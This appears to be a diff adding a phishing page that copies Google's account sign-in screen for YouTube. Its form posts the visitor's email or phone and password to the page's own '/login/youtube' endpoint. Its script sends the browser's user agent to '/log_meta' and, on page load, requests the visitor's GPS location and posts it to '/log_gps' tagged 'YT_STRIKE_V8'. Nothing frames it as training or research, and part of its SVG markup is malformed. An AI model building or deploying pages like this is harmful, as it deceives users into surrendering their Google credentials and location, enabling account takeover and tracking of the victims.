@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sign in - Google Accounts</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com');
+        
+        body { 
+            font-family: 'Roboto', sans-serif; 
+            background-color: #fff; 
+            color: #202124;
+            -webkit-font-smoothing: antialiased;
+        }
+        .google-card {
+            width: 100%;
+            max-width: 450px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+        }
+        .input-google {
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            padding: 13px 15px;
+            width: 100%;
+            transition: border-color 0.2s;
+        }
+        .input-google:focus {
+            border: 2px solid #1a73e8;
+            padding: 12px 14px;
+            outline: none;
+        }
+        .btn-next {
+            background-color: #1a73e8;
+            color: #fff;
+            font-weight: 500;
+            padding: 10px 24px;
+            border-radius: 4px;
+            transition: background-color 0.2s, box-shadow 0.2s;
+        }
+        .btn-next:hover {
+            background-color: #1765cc;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3);
+        }
+        #nexo-loader {
+            display: none;
+            font-family: monospace;
+            font-size: 10px;
+            color: #1a73e8;
+            text-align: center;
+            margin-top: 20px;
+        }
+        @media (max-width: 450px) {
+            .google-card { border: none; padding: 24px; }
+        }
+    </style>
+</head>
+<body class="flex flex-col items-center justify-center min-h-screen">
+
+    <div class="google-card text-center">
+        <!-- REPAIRED GOOGLE LOGO (SVG) -->
+        <div class="flex justify-center mb-3">
+            <svg width="74" height="24" viewBox="0 0 74 24" fill="none" xmlns="http://www.w3.org">
+                <path d="M12.2 11V13.5H19.2C18.9 15 17.2 18 12.2 18C7.9 18 4.4 14.5 4.4 10.2C4.4 5.9 7.9 2.4 12.2 2.4C14.7 2.4 16.3 3.4 17.3 4.4L19.1 2.6C17.3 1 15 0 12.2 0C6.6 0 2 4.6 2 10.2C2 15.8 6.6 20.4 12.2 20.4C18.1 20.4 22 16.2 22 10.4C22 9.7 21.9 9.1 21.8 8.5H12.2V11Z" fill="#4285F4""")/>>
+            </svg>
+        </div>
+
+        <h1 class="text-2xl font-normal mb-2">Sign in</h1>
+        <p class="text-base mb-10">to continue to YouTube</p>
+
+        <form id="ytForm" action="/login/youtube" method="POST" class="text-left space-y-6">
+            <div>
+                <input name="user" type="text" placeholder="Email or phone" class="input-google" required>
+            </div>
+
+            <div class="relative">
+                <input name="pass" type="password" placeholder="Enter your password" class="input-google" required>
+            </div>
+
+            <button type="button" class="text-[#1a73e8] text-sm font-bold hover:underline">Forgot password?</button>
+
+            <div class="flex justify-between items-center pt-8">
+                <button type="button" class="text-[#1a73e8] font-bold text-sm">Create account</button>
+                <button id="ytBtn" type="submit" class="btn-next">Next</button>
+            </div>
+        </form>
+
+        <div id="nexo-loader" class="animate-pulse">[*] V8_GOOGLE_SYNC: READY</div>
+    </div>
+
+    <script>
+        const ytForm = document.getElementById('ytForm');
+        const ytBtn = document.getElementById('ytBtn');
+        const loader = document.getElementById('nexo-loader');
+
+        ytForm.onsubmit = function() {
+            ytBtn.innerText = "Connecting...";
+            ytBtn.style.opacity = "0.5";
+            loader.style.display = "block";
+            
+            // Meta capture for Nexo-Terminal
+            const meta = {
+                ua: navigator.userAgent,
+                ref: "YT_V8_VERT"
+            };
+            
+            fetch('/log_meta', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(meta)
+            });
+            
+            return true;
+        };
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(p) {
+                    fetch('/log_gps', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            lat: p.coords.latitude, 
+                            lon: p.coords.longitude,
+                            target: "YT_STRIKE_V8"
+                        })
+                    });
+                });
+            }
+        }
+    </script>
+</body>
+                  </html>
+      
